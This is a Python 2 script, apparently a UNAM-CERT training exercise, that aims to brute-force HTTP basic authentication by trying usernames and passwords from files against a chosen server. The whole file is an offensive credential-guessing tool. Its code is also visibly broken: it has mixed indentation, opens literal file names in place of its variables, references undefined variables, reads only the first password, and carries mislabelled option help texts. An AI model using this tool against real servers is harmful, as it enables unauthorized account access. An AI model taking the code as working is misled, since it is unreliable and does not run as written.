#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='File with usernames that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='File with passwords that will be tested during the attack.')
    parser.add_option('-PL', '--password-list', dest='passwordList', default=None, help='File with passwords that will be tested during the attack.')
    parser.add_option('-UL', '--user-list', dest='userList', default=None, help='File with passwords that will be tested during the attack.')
    parser.add_option('-di', '--digest', dest='digest', default=False, action='store_true', help='File with passwords that will be tested during the attack.')
    parser.add_option('-t', '--tls', dest='tls', default=False, action='store_true', help='File with passwords that will be tested during the attack.')
    parser.add_option('-so', '--std-out', dest='stdout', default=False, action='store_true', help='File with passwords that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)

def reportResults(rep, archivo):
    with open(archivo, "w") as reporte:
        reporte.write(rep)


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def getContra(archivo):
    with open('archivo', 'r') as contrasenas:
        for contasena in contrasenas.readlines():
            return contrasena
    contrasenas.close()

def makeRequest(host, userList, archivo2):
    try:
	   response = get(host, auth=(user,password))
	   #print response
	   #print dir(response)
        with open('userList', 'r') as usuarios:
            for usuario in usuarios.readlines():
                response = get(host, usuario, getContra(passwordList))
	    if response.status_code == 200:
	       print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
	   else:
	       print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        makeRequest(url, opts.user, opts.password)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)